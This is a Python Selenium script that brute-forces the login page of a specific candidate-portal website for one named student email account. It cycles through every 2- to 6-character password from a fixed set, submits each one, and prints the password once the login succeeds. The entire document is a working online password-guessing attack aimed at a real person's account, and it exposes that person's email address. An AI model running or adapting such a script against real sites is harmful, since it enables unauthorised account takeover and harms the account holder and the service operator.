from selenium import webdriver

characters =  \
     ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','V','W','X','Y','Z',
     'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
     '1','2','3','4','5','6','7','8','9',
     '*','-',' ']

len_min , len_max = 2 , 6

url = 'https://ecs.monespacecandidat.com/'
utilisateur = 'nabil.abdelouahed@student-cs.fr'

driver = webdriver.Chrome()
driver.get(url)

def generate_rec(characters,length):
     pwd = []
     if length == 1 :
          return(characters.copy())
     else :
          pwd_list = generate_rec(characters,length-1)
          for i in range(len(pwd_list)) :
               for j in range(len(characters)):
                    pwd.append(pwd_list[i]+characters[j])
     return(pwd)

length = len_min
print(">>>>>>> generating passwords "+str(length-1)+" <<<<<<<")
pwd = generate_rec(characters,length-1)
print(">>>>>>> done <<<<<<<")

while True :
     while driver.current_url == url and length<=len_max:
          print(">>>>>>> generating passwords "+str(length)+" <<<<<<<")
          pwd2 = []
          for k in range(len(pwd)) :
               for j in range(len(characters)):
                    pwd2.append(pwd[k]+characters[j])
          pwd = pwd2.copy()
          print(">>>>>>> done <<<<<<<")
          for i in range(len(pwd)):
               password = pwd[i]
               print(f">>> TRYING : {password}")
               elem = driver.find_element(by='name',value = "login")
               elem.clear()
               elem.send_keys(utilisateur)

               elem2 = driver.find_element(by='name',value = "password")
               elem2.clear()
               elem2.send_keys(password)
               driver.find_element(by = 'id', value = 'Valider').click()
               if driver.current_url != url :
                    print(">>>> your password is : "+str(password)+" <<<<")
                    break
          length+=1
     pass